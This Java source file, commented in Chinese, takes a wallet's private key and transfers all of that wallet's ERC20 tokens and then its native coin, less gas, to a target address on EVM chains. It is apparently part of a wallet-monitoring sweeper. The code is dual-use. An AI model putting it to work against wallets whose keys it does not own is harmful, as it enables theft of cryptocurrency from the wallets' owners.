package com.monitor;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import okhttp3.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.web3j.crypto.*;
import org.web3j.utils.Convert;
import org.web3j.utils.Numeric;

import java.math.BigDecimal;
import java.math.BigInteger;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class TransactionSender {
    private static final Logger logger = LoggerFactory.getLogger(TransactionSender.class);
    private static final OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build();
    private static final ObjectMapper objectMapper = new ObjectMapper();
    private static final MediaType JSON = MediaType.get("application/json; charset=utf-8");

    /**
     * 转移原生代币到目标地址
     * @param privateKey 源钱包私钥
     * @param targetAddress 目标地址
     * @param chainConfig 链配置
     * @return 交易哈希
     */
    public static String transferNativeToken(String privateKey, String targetAddress, ChainConfig chainConfig) {
        try {
            // 非EVM链特殊处理
            if (!chainConfig.isEVM()) {
                if (chainConfig.getName().contains("Solana")) {
                    return transferSolana(privateKey, targetAddress, chainConfig);
                }
                logger.warn("暂不支持非EVM链的转账: {}", chainConfig.getName());
                return null;
            }

            // 创建凭证
            Credentials credentials = Credentials.create(privateKey);
            String fromAddress = credentials.getAddress();

            // 获取当前余额
            BigDecimal balance = WalletMonitor.getNativeBalance(fromAddress, chainConfig);
            if (balance.compareTo(BigDecimal.ZERO) <= 0) {
                logger.warn("余额不足，无法转账 - 链: {}, 地址: {}", chainConfig.getName(), fromAddress);
                return null;
            }

            // 获取nonce
            BigInteger nonce = getTransactionCount(fromAddress, chainConfig);
            
            // 获取gas价格
            BigInteger gasPrice = WalletMonitor.getCurrentGasPrice(chainConfig);
            
            // 计算gas费用
            BigInteger gasLimit = BigInteger.valueOf(chainConfig.getGasLimit());
            BigInteger gasCost = gasPrice.multiply(gasLimit);
            
            // 计算转账金额（扣除gas费用）
            BigInteger weiBalance = Convert.toWei(balance, Convert.Unit.ETHER).toBigInteger();
            BigInteger transferAmount = weiBalance.subtract(gasCost);
            
            if (transferAmount.compareTo(BigInteger.ZERO) <= 0) {
                logger.warn("余额不足以支付gas费用 - 链: {}, 地址: {}, 余额: {} wei, gas费用: {} wei", 
                    chainConfig.getName(), fromAddress, weiBalance, gasCost);
                return null;
            }

            // 创建交易
            RawTransaction rawTransaction = RawTransaction.createEtherTransaction(
                nonce,
                gasPrice,
                gasLimit,
                targetAddress,
                transferAmount
            );

            // 签名交易
            byte[] signedMessage = TransactionEncoder.signMessage(rawTransaction, chainConfig.getChainId(), credentials);
            String signedTransactionData = Numeric.toHexString(signedMessage);

            // 发送交易
            String txHash = sendSignedTransaction(signedTransactionData, chainConfig);
            
            if (txHash != null) {
                BigDecimal transferAmountEther = Convert.fromWei(new BigDecimal(transferAmount), Convert.Unit.ETHER);
                logger.info("转账成功 - 链: {}, 从: {}, 到: {}, 金额: {} {}, 交易哈希: {}", 
                    chainConfig.getName(), fromAddress, targetAddress, transferAmountEther, chainConfig.getSymbol(), txHash);
            }
            
            return txHash;

        } catch (Exception e) {
            logger.error("转账失败 - 链: {}, 错误: {}", chainConfig.getName(), e.getMessage(), e);
            return null;
        }
    }

    /**
     * 转移ERC20代币到目标地址
     * @param privateKey 源钱包私钥
     * @param targetAddress 目标地址
     * @param tokenAddress 代币合约地址
     * @param tokenBalance 代币余额（原始单位）
     * @param chainConfig 链配置
     * @return 交易哈希
     */
    public static String transferERC20Token(String privateKey, String targetAddress, String tokenAddress, 
                                          BigInteger tokenBalance, ChainConfig chainConfig) {
        try {
            if (!chainConfig.isEVM()) {
                logger.warn("非EVM链不支持ERC20代币转移: {}", chainConfig.getName());
                return null;
            }

            // 创建凭证
            Credentials credentials = Credentials.create(privateKey);
            String fromAddress = credentials.getAddress();

            // 检查是否有足够的原生代币支付gas费用
            BigDecimal nativeBalance = WalletMonitor.getNativeBalance(fromAddress, chainConfig);
            BigInteger gasPrice = WalletMonitor.getCurrentGasPrice(chainConfig);
            BigInteger gasLimit = BigInteger.valueOf(100000L); // ERC20转账通常需要更多gas
            BigInteger gasCost = gasPrice.multiply(gasLimit);
            BigInteger nativeBalanceWei = Convert.toWei(nativeBalance, Convert.Unit.ETHER).toBigInteger();

            if (nativeBalanceWei.compareTo(gasCost) < 0) {
                logger.warn("原生代币余额不足以支付gas费用 - 链: {}, 地址: {}, 余额: {} wei, 需要: {} wei", 
                    chainConfig.getName(), fromAddress, nativeBalanceWei, gasCost);
                return null;
            }

            // 获取nonce
            BigInteger nonce = getTransactionCount(fromAddress, chainConfig);

            // 构建ERC20转账的函数调用数据
            // transfer(address,uint256)函数签名: 0xa9059cbb
            String functionSelector = "a9059cbb";
            String paddedAddress = String.format("%064x", new BigInteger(targetAddress.substring(2), 16));
            String paddedAmount = String.format("%064x", tokenBalance);
            String data = "0x" + functionSelector + paddedAddress + paddedAmount;

            // 创建交易
            RawTransaction rawTransaction = RawTransaction.createTransaction(
                nonce,
                gasPrice,
                gasLimit,
                tokenAddress,
                BigInteger.ZERO, // 转账ERC20代币时，value为0
                data
            );

            // 签名交易
            byte[] signedMessage = TransactionEncoder.signMessage(rawTransaction, chainConfig.getChainId(), credentials);
            String signedTransactionData = Numeric.toHexString(signedMessage);

            // 发送交易
            String txHash = sendSignedTransaction(signedTransactionData, chainConfig);
            
            if (txHash != null) {
                logger.info("ERC20代币转账成功 - 链: {}, 从: {}, 到: {}, 代币合约: {}, 余额: {}, 交易哈希: {}", 
                    chainConfig.getName(), fromAddress, targetAddress, tokenAddress, tokenBalance, txHash);
            }
            
            return txHash;

        } catch (Exception e) {
            logger.error("ERC20代币转账失败 - 链: {}, 代币合约: {}, 错误: {}", 
                chainConfig.getName(), tokenAddress, e.getMessage(), e);
            return null;
        }
    }

    /**
     * Solana转账（简化版本，实际需要更复杂的实现）
     */
    private static String transferSolana(String privateKey, String targetAddress, ChainConfig chainConfig) {
        // 注意：这里只是一个占位符实现
        // 实际的Solana转账需要使用Solana的SDK，包含更复杂的交易构建和签名过程
        logger.warn("Solana转账功能需要使用Solana SDK实现，当前版本暂不支持");
        return null;
    }

    /**
     * 获取账户的交易计数（nonce）
     */
    private static BigInteger getTransactionCount(String address, ChainConfig chainConfig) {
        try {
            String requestBody = String.format(
                "{\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"eth_getTransactionCount\",\"params\":[\"%s\",\"latest\"]}",
                address
            );

            Request request = new Request.Builder()
                    .url(chainConfig.getRpcUrl())
                    .post(RequestBody.create(requestBody, JSON))
                    .build();

            try (Response response = client.newCall(request).execute()) {
                if (response.isSuccessful() && response.body() != null) {
                    String responseBody = response.body().string();
                    JsonNode jsonNode = objectMapper.readTree(responseBody);
                    
                    if (jsonNode.has("result")) {
                        String hexCount = jsonNode.get("result").asText();
                        return new BigInteger(hexCount.substring(2), 16);
                    }
                }
            }
        } catch (Exception e) {
            logger.error("获取交易计数失败 - 链: {}, 地址: {}, 错误: {}", 
                chainConfig.getName(), address, e.getMessage());
        }
        return BigInteger.ZERO;
    }

    /**
     * 发送已签名的交易
     */
    private static String sendSignedTransaction(String signedTransactionData, ChainConfig chainConfig) {
        try {
            String requestBody = String.format(
                "{\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"eth_sendRawTransaction\",\"params\":[\"%s\"]}",
                signedTransactionData
            );

            Request request = new Request.Builder()
                    .url(chainConfig.getRpcUrl())
                    .post(RequestBody.create(requestBody, JSON))
                    .build();

            try (Response response = client.newCall(request).execute()) {
                if (response.isSuccessful() && response.body() != null) {
                    String responseBody = response.body().string();
                    JsonNode jsonNode = objectMapper.readTree(responseBody);
                    
                    if (jsonNode.has("result")) {
                        return jsonNode.get("result").asText();
                    } else if (jsonNode.has("error")) {
                        logger.error("发送交易失败 - 链: {}, 错误: {}", 
                            chainConfig.getName(), jsonNode.get("error").toString());
                    }
                }
            }
        } catch (Exception e) {
            logger.error("发送交易失败 - 链: {}, 错误: {}", chainConfig.getName(), e.getMessage());
        }
        return null;
    }

    /**
     * 转移钱包中的所有资产
     * @param privateKey 私钥
     * @param targetAddress 目标地址
     * @param chainConfig 链配置
     */
    public static void transferAllAssets(String privateKey, String targetAddress, ChainConfig chainConfig) {
        try {
            Credentials credentials = Credentials.create(privateKey);
            String fromAddress = credentials.getAddress();

            logger.info("开始转移所有资产 - 链: {}, 从: {}, 到: {}", 
                chainConfig.getName(), fromAddress, targetAddress);

            // 首先转移所有ERC20代币（如果是EVM链）
            if (chainConfig.isEVM()) {
                transferAllERC20Tokens(privateKey, targetAddress, chainConfig);
                
                // 等待一小段时间，确保ERC20转账完成
                Thread.sleep(3000);
            }

            // 最后转移原生代币
            String txHash = transferNativeToken(privateKey, targetAddress, chainConfig);
            if (txHash != null) {
                logger.info("原生代币转移完成 - 链: {}, 交易哈希: {}", chainConfig.getName(), txHash);
            }

        } catch (Exception e) {
            logger.error("转移所有资产失败 - 链: {}, 错误: {}", chainConfig.getName(), e.getMessage());
        }
    }

    /**
     * 转移所有ERC20代币
     */
    private static void transferAllERC20Tokens(String privateKey, String targetAddress, ChainConfig chainConfig) {
        try {
            Credentials credentials = Credentials.create(privateKey);
            String fromAddress = credentials.getAddress();

            List<WalletMonitor.TokenBalance> tokenBalances = WalletMonitor.getERC20TokenBalances(fromAddress, chainConfig);
            
            if (tokenBalances.isEmpty()) {
                logger.info("没有发现ERC20代币余额 - 链: {}, 地址: {}", chainConfig.getName(), fromAddress);
                return;
            }

            logger.info("发现 {} 个ERC20代币，开始转移 - 链: {}", tokenBalances.size(), chainConfig.getName());

            for (WalletMonitor.TokenBalance tokenBalance : tokenBalances) {
                try {
                    String txHash = transferERC20Token(privateKey, targetAddress, 
                        tokenBalance.contractAddress, tokenBalance.balance, chainConfig);
                    
                    if (txHash != null) {
                        logger.info("ERC20代币转移成功 - 合约: {}, 交易哈希: {}", 
                            tokenBalance.contractAddress, txHash);
                        
                        // 等待一段时间再处理下一个代币，避免nonce冲突
                        Thread.sleep(2000);
                    }
                    
                } catch (Exception e) {
                    logger.error("转移ERC20代币失败 - 合约: {}, 错误: {}", 
                        tokenBalance.contractAddress, e.getMessage());
                }
            }
            
        } catch (Exception e) {
            logger.error("转移所有ERC20代币失败 - 链: {}, 错误: {}", chainConfig.getName(), e.getMessage());
        }
    }
} 
